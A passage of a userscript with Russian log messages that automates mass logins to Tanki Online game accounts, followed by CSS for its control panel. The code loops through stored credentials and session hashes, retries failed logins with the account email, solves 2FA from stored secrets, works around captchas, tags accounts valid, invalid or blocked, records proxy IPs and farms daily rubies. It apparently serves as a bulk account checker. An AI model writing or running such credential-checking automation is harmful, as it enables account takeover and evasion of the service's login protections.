                console.log(`[Daily Rubies] 🔑 ${login}: уже в лобби по hash`);
            } else {
                if (!password) {
                    console.log(`[Daily Rubies] ⚠️ ${login}: нет пароля для входа`);
                    setAccountStatus(login, { ...prev, rubiesStatus: "Ошибка", rubiesError: "Нет пароля" });
                    const queue0 = getRubiesRunQueue();
                    const pos0 = queue0.indexOf(login);
                    const nextCursor0 = pos0 >= 0 ? pos0 + 1 : currentIndex + 1;
                    saveRubiesRunCursor(nextCursor0);
                    currentIndex = nextCursor0;
                    const next0 = queue0[nextCursor0] ? RUBIES_ACCOUNTS.find(a => a.login === queue0[nextCursor0]) : null;
                    if (next0 && isRunning) {
                        setRunningState(true);
                        await sleep(250);
                        if (next0.entranceHash) {
                            setRubiesHashSwitchTarget(next0);
                            setEntranceHash(next0.entranceHash);
                        } else {
                            clearGameSessionForPasswordLogin();
                            GM_setValue("tanki_rubies_force_credentials_v83", next0.login);
                        }
                        location.reload();
                        return { login, status: "hash_failed_next" };
                    }
                    clearRubiesRunState();
                    setRunningState(false);
                    updateUI();
                    return { login, status: "no_password" };
                }

                if (currentHash && (!acc.entranceHash || currentHash !== acc.entranceHash)) {
                    console.log(`[Daily Rubies] 🧹 Очистка старого hash перед входом по паролю`);
                    clearGameSessionForPasswordLogin();
                }

                await clickByText("Игровой аккаунт", 8500);
                await clickByText("Авторизация", 6500);
                await enterCredentialsAndPlay(usedLogin, password);
                await sleep(800);
                if (await reloadIfLoginFormEmptyTooLong(5000)) return { login, status: "reload_empty" };
            }

            let captchaResult = await handleCaptchaIfVisible(login, timestamp);
            if (captchaResult) return captchaResult;

            let triedEmail = false;
            let lobbyReached = false;
            while (isRunning) {
                timestamp = new Date().toLocaleTimeString();
                if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }
                if (await reloadIfLoginFormEmptyTooLong(5000)) return { login, status: "reload_empty" };

                captchaResult = await handleCaptchaIfVisible(login, timestamp);
                if (captchaResult) return captchaResult;

                if (isLogin2FAVisible()) {
                    const solved = await solveLogin2FAIfPresent(login, email);
                    if (solved === "solved") {
                        resetCaptchaCount("2FA solved rubies");
                        await sleep(400);
                        continue;
                    }
                    resetCaptchaCount("2FA");
                    setAccountStatus(login, { ...prev, twofa: true, rubiesStatus: "2FA", reason: solved === "no_secret" ? "2FA: нет секрета" : "Требуется 2FA" });
                    currentIndex++;
                    return { login, status: "twofa" };
                }
                const blocked = document.querySelector(".SystemMessageStyle-message");
                if (blocked && blocked.textContent.includes("заблокирован")) {
                    resetCaptchaCount("blocked");
                    setAccountStatus(login, { ...prev, blocked: true, rubiesStatus: "Заблокирован", reason: "Аккаунт заблокирован" });
                    currentIndex++;
                    return { login, status: "blocked" };
                }
                const errorElement = document.querySelector(".EntranceComponentStyle-invalidForm");
                if (errorElement) {
                    if (!triedEmail && normalizeEmail(email)) {
                        triedEmail = true; usedLogin = email; loginWasEmail = true;
                        await sleep(200);
                        await enterCredentialsAndPlay(usedLogin, password);
                        continue;
                    }
                    resetCaptchaCount("invalid");
                    setAccountStatus(login, { ...prev, invalid: true, rubiesStatus: "Ошибка", reason: "Неверный логин/пароль" });
                    currentIndex++;
                    return { login, status: "invalid" };
                }
                if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
                    resetCaptchaCount("успешный вход rubies");
                    lobbyReached = true;
                    break;
                }
                await sleep(250);
            }
            if (!lobbyReached) return { login, status: "lobby_missing" };

            console.log(`[Daily Rubies] ✅ Лобби загружено`);
            await sleep(800);
            await ensureInLobby();

            {
                const liveHash = getCurrentEntranceHash();
                const liveNick = getCurrentNickname();
                if (liveHash) {
                    bindEntranceHashToAccount(login, liveHash, liveNick || acc.nickname);
                    acc.entranceHash = liveHash;
                    if (liveNick) acc.nickname = liveNick;
                    saveRubiesAccounts();
                }
            }

            const rubiesBefore = getRubies() || "0";

            console.log(`[Daily Rubies] 📋 Открываем МИССИИ`);
            const missionsOpened = await openMissionsTab();
            if (!missionsOpened) {
                setAccountStatus(login, { ...prev, rubiesStatus: "Ошибка", rubiesError: "Миссии не открылись" });
                currentIndex++;
                await exitToLobby().catch(() => {});
                return { login, status: "missions_fail" };
            }

            await handleLoginBonus();
            await sleep(600);

            console.log(`[Daily Rubies] ⭐ Открываем Особые`);
            const openedSpecial = await openSpecialMissions();
            let noDailyRubies = false;
            if (openedSpecial) {
                await tryCollectMission("Бонус за премиум");
                await sleep(600);
                const rubyResult = await tryCollectMission("Ежедневные Рубины");
                if (rubyResult.found && rubyResult.progress) {
                    const cd = rubyResult.progress.completed;
                    const td = rubyResult.progress.total;
                    const rem = Math.max(0, td - cd);
                    console.log(`[Daily Rubies] 💎 Прогресс: ${cd}/${td}`);
                    console.log(`[Daily Rubies] 💎 Осталось: ${rem} дней`);
                    prev.rubiesCompletedDays = cd;
                    prev.rubiesTotalDays = td;
                    prev.rubiesRemainingDays = rem;
                    if (rem <= 0) {
                        prev.rubiesSubscriptionFinished = true;
                        console.log(`[Daily Rubies] ⏹ Подписка завершена для ${login}`);
                    }
                } else if (!rubyResult.found) {
                    noDailyRubies = true;
                    console.log(`[Daily Rubies] ⏹ Нет «Ежедневные Рубины» на ${login} — больше не заходим`);
                }
            } else {
                noDailyRubies = true;
                console.log(`[Daily Rubies] ⚠️ «Особые» не открылись / пусто — нет дейликов на ${login}`);
            }

            if (noDailyRubies) {
                prev.rubiesNoDaily = true;
                prev.rubiesSubscriptionFinished = true;
                prev.rubiesStatus = "Нет дейликов";
                prev.rubiesEnabled = false;
                prev.rubiesEligible = false;
            }

            const rubiesAfter = await waitForBalanceUpdate(rubiesBefore);
            console.log(`[Daily Rubies] 💎 Баланс после сбора: ${rubiesAfter}`);

            const username = getCurrentNickname();
            const experience = getExperience();
            const rankName = getRankByExperience(experience).rankName;
            const crystals = getCrystals();
            const ip = CONFIG.IP_CHECK_ENABLED ? await fetchCurrentIP() : null;
            const accInfo = ACCOUNTS.find(a => a.login === login) || {};

            const newStatus = {
                ...prev,
                done: true,
                valid: true,
                username: username || prev.username,
                rank: rankName,
                experience,
                crystals: crystals || prev.crystals,
                rubies: rubiesAfter,
                rubiesBeforeCollection: rubiesBefore,
                rubiesAfterCollection: rubiesAfter,
                rubiesEnabled: prev.rubiesNoDaily ? false : true,
                rubiesEligible: prev.rubiesNoDaily ? false : true,
                rubiesStatus: prev.rubiesNoDaily ? "Нет дейликов" : (prev.rubiesStatus === "Нет дейликов" ? "Нет дейликов" : "Собрано"),
                rubiesNoDaily: !!prev.rubiesNoDaily,
                lastRubiesCollection: prev.rubiesNoDaily ? (prev.lastRubiesCollection || null) : new Date().toISOString(),
                year: accInfo.year || prev.year,
                bound: accInfo.bound ?? prev.bound,
                proxyIp: ip || prev.proxyIp
            };
            setAccountStatus(login, newStatus);

            if (newStatus.rubiesSubscriptionFinished || newStatus.rubiesNoDaily) {
                archiveRubiesAccount(login);
                console.log(`[Daily Rubies] 🗄 ${login}: ${newStatus.rubiesNoDaily ? "нет дейликов" : "подписка завершена"} — в архив, больше не заходим`);
            }

            await notifyRubiesCollected({
                login,
                username: newStatus.username,
                rank: newStatus.rank,
                rubiesBefore,
                rubiesAfter,
                completedDays: newStatus.rubiesCompletedDays,
                totalDays: newStatus.rubiesTotalDays,
                remainingDays: newStatus.rubiesRemainingDays
            });

            const queue = getRubiesRunQueue();
            const currentPos = Math.max(0, queue.indexOf(login));
            const nextCursor = currentPos >= 0 ? currentPos + 1 : currentIndex + 1;
            saveRubiesRunCursor(nextCursor);
            currentIndex = nextCursor;

            if (!isRunning) return { login, status: "stopped" };

            const next = queue[nextCursor] ? RUBIES_ACCOUNTS.find(a => a.login === queue[nextCursor]) : null;
            if (next) {
                console.log(`[Daily Rubies] 🔄 Сбор завершён: ${login} → next ${next.login}`);
                setRunningState(true);
                await sleep(250);
                const nextIsPassword = accountNeedsPasswordLogin(next);
                if (next.entranceHash && !nextIsPassword) {
                    setRubiesHashSwitchTarget(next);
                    setEntranceHash(next.entranceHash);
                    await sleep(300);
                } else {
                    console.log(`[Daily Rubies] 🧹 Следующий аккаунт по паролю (${next.login}) — hard reset сессии`);
                    clearRubiesHashSwitchTarget();
                    clearGameSessionForPasswordLogin();
                    GM_setValue("tanki_rubies_force_credentials_v83", next.login);
                    await sleep(200);
                }
                location.reload();
                return { login, status: "next" };
            }

            console.log(`[Daily Rubies] ✔ Все аккаунты обработаны`);
            clearRubiesRunState();
            setRunningState(false);
            updateUI();
            showToast("Все аккаунты обработаны", "success");
            GM_setValue("tanki_rubies_show_done_toast", "1");
            await sleep(500);
            location.reload();
            return { login, status: "done" };

        } catch (error) {
            console.error(`[Daily Rubies] ❌ Ошибка ${login}:`, error);
            const p2 = getAccountStatus(login) || {};
            setAccountStatus(login, { ...p2, rubiesStatus: "Ошибка", rubiesError: error.message });
            const queue = getRubiesRunQueue();
            const pos = queue.indexOf(login);
            const nextCursor = pos >= 0 ? pos + 1 : currentIndex + 1;
            saveRubiesRunCursor(nextCursor);
            currentIndex = nextCursor;
            if (isRunning && queue[nextCursor]) {
                setRunningState(true);
                await sleep(250);
                location.reload();
                return { login, status: "next_after_error" };
            }
            clearRubiesRunState();
            setRunningState(false);
            return { login, status: "error" };
        }
    }
    // =========================================================
    // FILTERS / NEXT
    // =========================================================
    function getFilteredAccountsForCheck() {
        if (MODE === "fastValid") {
            return FAST_VALID_ACCOUNTS.filter(acc => acc && acc.login && acc.password);
        }
        let list = ACCOUNTS.filter(acc => {
            if (selectedYears.length > 0 && (!acc.year || !selectedYears.includes(acc.year))) return false;
            if (selectedRanks.length > 0) {
                const st = getAccountStatus(acc.login);
                const rank = (st?.rank || acc.rankFromBase || "").toLowerCase();
                if (!selectedRanks.some(r => rank.includes(r.toLowerCase()))) return false;
            }
            return true;
        });
        if (MODE === "rubies") {
            list = getRubiesEligibleAccounts();
        } else if (MODE === "nickname") {
            list = list.filter(acc => isNicknamePending(acc.login));
        }
        return list;
    }
    function getNextAccount() {
        const filtered = getFilteredAccountsForCheck();
        if (filtered.length === 0) return null;

        if (MODE === "rubies") {
            if (!shuffledAccounts.length) {
                const queue = getRubiesRunQueue();
                if (queue.length) {
                    shuffledAccounts = queue.map(login => RUBIES_ACCOUNTS.find(a => a.login === login)).filter(Boolean);
                    currentIndex = Math.min(getRubiesRunCursor(), shuffledAccounts.length);
                } else {
                    shuffledAccounts = [...filtered];
                    currentIndex = 0;
                }
            }
            const total = shuffledAccounts.length;
            if (!total) return null;
            let attempts = 0;
            while (attempts < total) {
                if (currentIndex >= total) return null;
                const acc = shuffledAccounts[currentIndex];
                const st = getAccountStatus(acc.login) || {};
                if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) { currentIndex++; attempts++; continue; }
                if (st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st)) { currentIndex++; attempts++; continue; }
                if (st.rubiesEnabled === false) { currentIndex++; attempts++; continue; }
                return acc;
            }
            return null;
        }

        if (shuffledAccounts.length === 0 || !shuffledAccounts.every(a => filtered.some(f => f.login === a.login))) {
            shuffledAccounts = shuffleArray(filtered);
            currentIndex = 0;
        }
        const total = shuffledAccounts.length;
        let attempts = 0;
        while (attempts < total) {
            const acc = shuffledAccounts[currentIndex % total];
            if (MODE === "nickname") {
                if (isNicknamePending(acc.login)) return acc;
            } else if (MODE === "fastValid") {
                if (!isFastValidFinished(acc.login)) return acc;
            } else {
                if (!isAccountFinished(acc.login)) return acc;
            }
            currentIndex++;
            attempts++;
        }
        return null;
    }
    function getNextRubiesAccount() {
        const filtered = getFilteredAccountsForCheck();
        for (let i = 0; i < filtered.length; i++) {
            const acc = filtered[(currentIndex + i) % filtered.length];
            const st = getAccountStatus(acc.login);
            if (!st) continue;
            if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) continue;
            if (st.lastRubiesCollection) {
                const age = Date.now() - new Date(st.lastRubiesCollection).getTime();
                if (age < 20 * 60 * 60 * 1000) continue;
            }
            return acc;
        }
        return null;
    }

    // =========================================================
    // UI — DESIGN SYSTEM
    // =========================================================
    function injectStyles() {
    try { document.getElementById("tchecker-premium-v72")?.remove(); } catch (_) {}
    try { document.getElementById("tchecker-styles")?.remove(); } catch (_) {}
    const style = document.createElement("style");
    style.id = "tchecker-styles";
    style.textContent = `
/* ===== RESET / BASE ===== */
#tc-menu.tchecker-ui,
#tc-menu.tchecker-ui *,
#tc-overlay.tchecker-ui,
#tc-detail-modal.tchecker-ui,
#tc-detail-modal.tchecker-ui *,
#tc-assets-modal.tchecker-ui,
#tc-assets-modal.tchecker-ui *,
#tc-gold-modal.tchecker-ui,
#tc-gold-modal.tchecker-ui *,
#tc-rubies-add-modal.tchecker-ui,
#tc-rubies-add-modal.tchecker-ui *,
.tc-toast-stack.tchecker-ui,
.tc-toast-stack.tchecker-ui *{
  box-sizing:border-box;
}
#tc-menu.tchecker-ui,
#tc-detail-modal.tchecker-ui,
#tc-assets-modal.tchecker-ui,
#tc-gold-modal.tchecker-ui,
#tc-rubies-add-modal.tchecker-ui,
.tc-toast-stack.tchecker-ui{
  font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
  -webkit-font-smoothing:antialiased;
  color:var(--tc-text);
}
#tc-menu.tchecker-ui svg,
#tc-detail-modal.tchecker-ui svg,
#tc-assets-modal.tchecker-ui svg,
#tc-gold-modal.tchecker-ui svg{width:16px;height:16px;flex-shrink:0;display:block}

/* ===== THEMES ===== */
#tc-menu.tchecker-ui[data-theme="dark"],
#tc-detail-modal.tchecker-ui[data-theme="dark"],
#tc-rubies-add-modal.tchecker-ui[data-theme="dark"],
#tc-assets-modal.tchecker-ui[data-theme="dark"],
#tc-gold-modal.tchecker-ui[data-theme="dark"],
.tc-toast-stack.tchecker-ui[data-theme="dark"]{
  --tc-bg:#0b0b0d;
  --tc-bg-2:#111114;
  --tc-surface:#16161a;
  --tc-surface-2:#1c1c22;
  --tc-surface-3:#24242c;
  --tc-border:#2a2a32;
  --tc-border-2:#3a3a46;
  --tc-text:#f2f2f5;
  --tc-text-muted:#9a9aa8;
  --tc-text-dim:#6b6b78;
  --tc-accent:#c43b6e;
  --tc-accent-soft:rgba(196,59,110,.16);
  --tc-accent-strong:#e04d82;
  --tc-success:#3ecf8e;
  --tc-warning:#f0b429;
  --tc-danger:#ff5c68;
  --tc-info:#5b9fd4;
  --tc-scroll-thumb:#3a3a46;
  --tc-scroll-track:#111114;
  --tc-sidebar-bg:#0e0e12;
  --tc-sidebar-text:#f2f2f5;
  --tc-sidebar-muted:#9a9aa8;
  --tc-sidebar-dim:#6b6b78;
  --tc-shadow:0 28px 80px rgba(0,0,0,.65);
}

#tc-menu.tchecker-ui[data-theme="light"],
#tc-detail-modal.tchecker-ui[data-theme="light"],
#tc-rubies-add-modal.tchecker-ui[data-theme="light"],
#tc-assets-modal.tchecker-ui[data-theme="light"],
#tc-gold-modal.tchecker-ui[data-theme="light"],
.tc-toast-stack.tchecker-ui[data-theme="light"]{
  --tc-bg:#f6f4ef;
  --tc-bg-2:#efece4;
  --tc-surface:#ffffff;
  --tc-surface-2:#f7f5ef;
  --tc-surface-3:#ece8de;
  --tc-border:#ddd6c8;
  --tc-border-2:#cfc6b4;
  --tc-text:#1c1914;
  --tc-text-muted:#6f675c;
  --tc-text-dim:#9a9184;
  --tc-accent:#a33d65;
  --tc-accent-soft:rgba(163,61,101,.12);
  --tc-accent-strong:#c24d7a;
  --tc-success:#2f9e6a;
  --tc-warning:#c48a12;
  --tc-danger:#d1434b;
  --tc-info:#3d7eb5;
  --tc-scroll-thumb:#cfc6b4;
  --tc-scroll-track:#efece4;
  --tc-sidebar-bg:#f0ece3;
  --tc-sidebar-text:#1c1914;
  --tc-sidebar-muted:#5c554b;
  --tc-sidebar-dim:#8a8174;
  --tc-shadow:0 28px 80px rgba(40,30,15,.18);
}

/* ===== SHELL ===== */
#tc-overlay{
  position:fixed;inset:0;z-index:99998;
  background:rgba(0,0,0,.62);
  backdrop-filter:blur(14px);
  opacity:0;visibility:hidden;
  transition:opacity .2s ease,visibility .2s ease;
}
#tc-overlay.open{opacity:1;visibility:visible}

#tc-menu{
  position:fixed;top:50%;left:50%;
  transform:translate(-50%,-50%) scale(.97);
  z-index:99999;
  width:min(1200px,calc(100vw - 24px));
  height:min(800px,calc(100vh - 24px));
  opacity:0;visibility:hidden;pointer-events:none;
  transition:opacity .22s ease,transform .22s cubic-bezier(.22,.61,.36,1),visibility .22s;
}
#tc-menu.open{
  opacity:1;visibility:visible;pointer-events:auto;
  transform:translate(-50%,-50%) scale(1);
}

#tc-panel{
  width:100%;height:100%;
  display:grid;
  grid-template-columns:248px minmax(0,1fr);
  grid-template-rows:72px minmax(0,1fr);
  grid-template-areas:"sidebar header" "sidebar content";
  background:var(--tc-bg);
  border:1px solid var(--tc-border);
  border-radius:20px;
  overflow:hidden;
  box-shadow:var(--tc-shadow);
  color:var(--tc-text) !important;
}

/* ===== SIDEBAR — force readable text in both themes ===== */
#tc-menu .tc-tabs{
  grid-area:sidebar;
  display:flex;flex-direction:column;
  padding:20px 12px 14px;
  background:var(--tc-sidebar-bg) !important;
  border-right:1px solid var(--tc-border);
  color:var(--tc-sidebar-text) !important;
}
#tc-menu .tc-brand{display:flex;align-items:center;gap:12px;margin-bottom:22px;padding:0 8px}
#tc-menu .tc-brand-mark{
  width:40px;height:40px;border-radius:12px;
  background:linear-gradient(135deg,var(--tc-accent),var(--tc-accent-strong));
  display:flex;align-items:center;justify-content:center;
  color:#fff !important;font-weight:800;font-size:14px;letter-spacing:-.3px;
  box-shadow:0 8px 20px var(--tc-accent-soft);
}
#tc-menu .tc-brand-text{display:flex;flex-direction:column;gap:3px;min-width:0}
#tc-menu .tc-brand-text b{
  font-size:13px;font-weight:800;letter-spacing:.3px;
  color:var(--tc-sidebar-text) !important;
}
#tc-menu .tc-brand-text small{
  font-size:9px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;
  color:var(--tc-sidebar-muted) !important;
}

#tc-menu .tc-nav{display:flex;flex-direction:column;gap:3px;flex:1;overflow:auto}
#tc-menu .tc-nav-label{
  font-size:9px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
  color:var(--tc-sidebar-dim) !important;
  padding:14px 10px 6px;
}

#tc-menu .tc-tab{
  display:flex;align-items:center;gap:10px;
  min-height:42px;padding:0 12px;
  border-radius:11px;
  border:1px solid transparent;
  background:transparent;
  color:var(--tc-sidebar-muted) !important;
  font-size:13px;font-weight:600;letter-spacing:.01em;
  text-align:left;cursor:pointer;font-family:inherit;
  transition:background .15s ease,color .15s ease,border-color .15s ease;
}
#tc-menu .tc-tab span{color:inherit !important}
#tc-menu .tc-tab svg{width:17px;height:17px;opacity:.9;color:inherit !important;stroke:currentColor}
#tc-menu .tc-tab:hover{
  background:var(--tc-surface) !important;
  color:var(--tc-sidebar-text) !important;
  border-color:var(--tc-border);
}
#tc-menu .tc-tab.active{
  background:var(--tc-accent-soft) !important;
  color:var(--tc-sidebar-text) !important;
  border-color:transparent;
  box-shadow:inset 3px 0 0 var(--tc-accent);
}
#tc-menu .tc-sidebar-footer{
  margin-top:10px;padding:12px 10px 4px;
  border-top:1px solid var(--tc-border);
  font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;
  color:var(--tc-sidebar-dim) !important;
}

/* ===== HEADER ===== */
#tc-menu .tc-header{
  grid-area:header;
  display:flex;align-items:center;justify-content:space-between;
  padding:0 24px;
  background:var(--tc-bg);
  border-bottom:1px solid var(--tc-border);
}
#tc-menu .tc-header-left{display:flex;flex-direction:column;gap:2px}
#tc-menu .tc-title{font-size:18px;font-weight:800;letter-spacing:-.02em;color:var(--tc-text) !important}
#tc-menu .tc-subtitle{font-size:12px;color:var(--tc-text-muted) !important}
#tc-menu .tc-header-right{display:flex;align-items:center;gap:8px}

#tc-menu .tc-chip{
  display:inline-flex;align-items:center;gap:8px;
  height:34px;padding:0 12px;border-radius:999px;
  background:var(--tc-surface);border:1px solid var(--tc-border);
  color:var(--tc-text-muted) !important;
  font-size:11px;font-weight:650;
}
#tc-menu .tc-chip .dot{
  width:7px;height:7px;border-radius:50%;
  background:var(--tc-success);box-shadow:0 0 0 3px rgba(62,207,142,.18);
}
#tc-menu .tc-chip.idle .dot{background:var(--tc-text-dim);box-shadow:none}
#tc-menu .tc-chip.warning .dot{background:var(--tc-warning)}
#tc-menu .tc-chip.danger .dot{background:var(--tc-danger)}

#tc-menu .tc-icon-btn{
  width:34px;height:34px;border-radius:10px;
  border:1px solid var(--tc-border);
  background:var(--tc-surface);
  color:var(--tc-text-muted) !important;
  display:inline-flex;align-items:center;justify-content:center;
  cursor:pointer;transition:all .15s ease;
}
#tc-menu .tc-icon-btn:hover{
  color:var(--tc-text) !important;
  border-color:var(--tc-border-2);
  background:var(--tc-surface-2);
}

/* ===== CONTENT ===== */
#tc-menu .tc-tab-content{
  grid-area:content;display:none;overflow:auto;
  padding:22px 26px 28px;
  background:var(--tc-bg);
  color:var(--tc-text) !important;
  scrollbar-width:thin;
  scrollbar-color:var(--tc-scroll-thumb) var(--tc-scroll-track);
}
#tc-menu .tc-tab-content.active{display:block}
#tc-menu .tc-tab-content::-webkit-scrollbar{width:8px}
#tc-menu .tc-tab-content::-webkit-scrollbar-thumb{background:var(--tc-scroll-thumb);border-radius:8px}
#tc-menu .tc-tab-content::-webkit-scrollbar-track{background:transparent}

#tc-menu .tc-section-title{
  margin:0 0 12px;
  font-size:10px;font-weight:800;letter-spacing:.14em;text-transform:uppercase;
  color:var(--tc-text-dim) !important;
}

/* ===== STATS / CARDS ===== */
#tc-menu .tc-stats{
  display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
  gap:10px;margin-bottom:8px;
}
#tc-menu .tc-stat{
  position:relative;
  padding:14px 14px 12px;
  border-radius:14px;
  background:var(--tc-surface);
  border:1px solid var(--tc-border);
  transition:transform .15s ease,border-color .15s ease;
}
#tc-menu .tc-stat:hover{border-color:var(--tc-border-2);transform:translateY(-1px)}
#tc-menu .tc-stat-icon{position:absolute;top:12px;right:12px;opacity:.35;color:var(--tc-text-muted)}
#tc-menu .tc-stat-value{font-size:22px;font-weight:800;letter-spacing:-.03em;color:var(--tc-text) !important}
#tc-menu .tc-stat-label{margin-top:6px;font-size:10px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--tc-text-muted) !important}
#tc-menu .tc-stat-sub{margin-top:3px;font-size:11px;color:var(--tc-text-dim) !important}

#tc-menu .tc-account-card,
#tc-menu .tc-prem-card{
  display:flex;align-items:center;justify-content:space-between;gap:12px;
  padding:12px 14px;margin-bottom:8px;
  border-radius:12px;
  background:var(--tc-surface);
  border:1px solid var(--tc-border);
  color:var(--tc-text) !important;
  transition:border-color .15s ease,background .15s ease;
}
#tc-menu .tc-account-card:hover,
#tc-menu .tc-prem-card:hover{border-color:var(--tc-border-2);background:var(--tc-surface-2)}
#tc-menu .tc-account-card .login,
#tc-menu .tc-prem-login{font-size:13px;font-weight:700;color:var(--tc-text) !important}
#tc-menu .tc-account-card .details,
#tc-menu .tc-prem-rank{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
#tc-menu .tag{
  display:inline-flex;align-items:center;
  padding:2px 8px;border-radius:999px;
  background:var(--tc-surface-3);
  border:1px solid var(--tc-border);
  font-size:10px;font-weight:600;
  color:var(--tc-text-muted) !important;
}
#tc-menu .tag.accent{background:var(--tc-accent-soft);color:var(--tc-accent-strong) !important;border-color:transparent}
#tc-menu .tc-status-tag{
  flex:0 0 auto;padding:4px 10px;border-radius:999px;
  font-size:10px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;
}
#tc-menu .tag-done{background:rgba(62,207,142,.15);color:var(--tc-success) !important}
#tc-menu .tag-ready{background:var(--tc-accent-soft);color:var(--tc-accent-strong) !important}
#tc-menu .tag-pending{background:var(--tc-surface-3);color:var(--tc-text-muted) !important}
#tc-menu .tag-invalid,#tc-menu .tag-blocked,#tc-menu .tag-error{background:rgba(255,92,104,.12);color:var(--tc-danger) !important}
#tc-menu .tag-twofa,#tc-menu .tag-nickname{background:rgba(240,180,41,.14);color:var(--tc-warning) !important}

#tc-menu .tc-empty{
  padding:28px 20px;text-align:center;
  border:1px dashed var(--tc-border-2);border-radius:14px;
  color:var(--tc-text-muted) !important;
}
#tc-menu .tc-empty h4{margin:0 0 6px;color:var(--tc-text) !important;font-size:14px}
#tc-menu .tc-empty p{margin:0;font-size:12px;color:var(--tc-text-dim) !important}

/* ===== CONTROLS ===== */
#tc-menu .tc-actions{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0}
#tc-menu .tc-btn{
  display:inline-flex;align-items:center;justify-content:center;gap:7px;
  min-height:36px;padding:0 14px;
  border-radius:10px;border:1px solid transparent;
  font-size:12px;font-weight:700;font-family:inherit;
  cursor:pointer;transition:all .15s ease;
}
#tc-menu .tc-btn svg{width:14px;height:14px}
#tc-menu .tc-btn-primary{
  background:linear-gradient(135deg,var(--tc-accent),var(--tc-accent-strong));
  color:#fff !important;border-color:transparent;
  box-shadow:0 6px 16px var(--tc-accent-soft);
}
#tc-menu .tc-btn-primary:hover{filter:brightness(1.06)}
#tc-menu .tc-btn-secondary{
  background:var(--tc-surface);color:var(--tc-text) !important;
  border-color:var(--tc-border);
}
#tc-menu .tc-btn-secondary:hover{background:var(--tc-surface-2);border-color:var(--tc-border-2)}
#tc-menu .tc-btn-danger{
  background:rgba(255,92,104,.1);color:var(--tc-danger) !important;
  border-color:rgba(255,92,104,.22);
}
#tc-menu .tc-btn-danger:hover{background:rgba(255,92,104,.18)}
#tc-menu .tc-btn:disabled{opacity:.45;cursor:not-allowed}

#tc-menu .tc-mode-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
#tc-menu .tc-mode-btn{
  min-height:34px;padding:0 14px;border-radius:10px;
  border:1px solid var(--tc-border);background:var(--tc-surface);
  color:var(--tc-text-muted) !important;font-size:12px;font-weight:700;
  cursor:pointer;font-family:inherit;
}
#tc-menu .tc-mode-btn.active{
  background:var(--tc-accent-soft);color:var(--tc-accent-strong) !important;
  border-color:transparent;
}

#tc-menu .tc-filters{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
#tc-menu .tc-filter-btn{
  min-height:30px;padding:0 11px;border-radius:999px;
  border:1px solid var(--tc-border);background:var(--tc-surface);
  color:var(--tc-text-muted) !important;font-size:11px;font-weight:700;
  cursor:pointer;font-family:inherit;
}
#tc-menu .tc-filter-btn.active{
  background:var(--tc-accent-soft);color:var(--tc-text) !important;border-color:transparent;
}
#tc-menu .tc-filter-btn.danger.active{background:rgba(255,92,104,.12);color:var(--tc-danger) !important}

#tc-menu .tc-search,
#tc-menu .tc-setting-input,
#tc-menu .tc-import-area,
#tc-menu select.tc-setting-input,
#tc-menu textarea{
  width:100%;
  border-radius:11px;
  border:1px solid var(--tc-border);
  background:var(--tc-surface) !important;
  color:var(--tc-text) !important;
  font:13px/1.45 inherit;
  outline:none;
}
#tc-menu .tc-search,
#tc-menu .tc-setting-input,
#tc-menu select.tc-setting-input{height:40px;padding:0 12px;margin-bottom:10px}
#tc-menu .tc-import-area,
#tc-menu textarea{min-height:120px;padding:12px;resize:vertical}
#tc-menu .tc-search:focus,
#tc-menu .tc-setting-input:focus,
#tc-menu .tc-import-area:focus,
#tc-menu textarea:focus{
  border-color:var(--tc-accent);
  box-shadow:0 0 0 3px var(--tc-accent-soft);
}
#tc-menu .tc-search::placeholder,
#tc-menu textarea::placeholder{color:var(--tc-text-dim) !important}

#tc-menu .tc-status-bar{
  padding:10px 14px;margin-bottom:12px;border-radius:11px;
  background:var(--tc-surface);border:1px solid var(--tc-border);
  font-size:12px;color:var(--tc-text-muted) !important;
}
#tc-menu .tc-status-bar .hl{color:var(--tc-text) !important;font-weight:700}

#tc-menu .tc-switch{
  display:flex;align-items:center;justify-content:space-between;gap:12px;
  padding:12px 14px;margin-bottom:8px;
  border-radius:12px;background:var(--tc-surface);border:1px solid var(--tc-border);
  cursor:pointer;color:var(--tc-text) !important;
}
#tc-menu .tc-switch span{color:var(--tc-text) !important;font-size:13px;font-weight:600}
#tc-menu .tc-switch input{display:none}
#tc-menu .tc-switch-track{
  width:40px;height:22px;border-radius:99px;background:var(--tc-surface-3);
  position:relative;border:1px solid var(--tc-border);flex-shrink:0;
}
#tc-menu .tc-switch-track::after{
  content:"";position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;
  background:var(--tc-text-muted);transition:transform .18s ease,background .18s ease;
}
#tc-menu .tc-switch input:checked + .tc-switch-track{background:var(--tc-accent);border-color:transparent}
#tc-menu .tc-switch input:checked + .tc-switch-track::after{transform:translateX(18px);background:#fff}

#tc-menu .tc-setting-row{
  display:flex;align-items:center;justify-content:space-between;gap:12px;
  padding:10px 0;border-bottom:1px solid var(--tc-border);
}
#tc-menu .tc-setting-label{font-size:13px;font-weight:600;color:var(--tc-text) !important}
#tc-menu .tc-setting-row .tc-setting-input{width:220px;margin:0}

#tc-menu .tc-dropzone{
  padding:28px;text-align:center;border-radius:14px;
  border:1px dashed var(--tc-border-2);background:var(--tc-surface);
  color:var(--tc-text-muted) !important;
}
#tc-menu .tc-dropzone.dragging{border-color:var(--tc-accent);background:var(--tc-accent-soft)}
#tc-menu .tc-dropzone h3{margin:0 0 6px;color:var(--tc-text) !important;font-size:15px}
#tc-menu .tc-dropzone p,#tc-menu .tc-dropzone small{color:var(--tc-text-dim) !important}

#tc-menu .tc-account-list{max-height:360px;overflow:auto}

/* prem cards */
#tc-menu .tc-prem-card{flex-direction:column;align-items:stretch;gap:10px}
#tc-menu .tc-prem-top{display:flex;justify-content:space-between;gap:10px;align-items:flex-start}
